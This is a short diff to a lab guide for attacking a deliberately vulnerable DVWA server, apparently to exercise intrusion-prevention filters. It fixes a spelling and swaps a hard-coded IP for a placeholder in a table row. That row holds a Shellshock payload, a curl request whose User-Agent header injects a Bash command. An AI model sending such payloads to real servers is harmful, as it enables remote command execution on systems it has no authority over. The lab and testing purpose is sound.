@@ -103,8 +103,8 @@ Below are some SQL attacks you can perform on your DVWA server
 
 ### Inbound Attacks
 
-Inbound attacks could be performed on any publically accessible webserver. In this case, we can perform a simple Shell Shock attack on our DVWA server
+Inbound attacks could be performed on any publicly accessible webserver. In this case, we can perform a simple Shell Shock attack on our DVWA server
 
 | Filter ID  | Attack                                                             |
 | :--------- | :----------------------------------------------------------------- |
-| 16798      | `curl -H "User-Agent: () { :; }; /bin/eject" http://20.44.162.152` |
+| 16798      | `curl -H "User-Agent: () { :; }; /bin/eject" http://<DVWAServerIP>` |
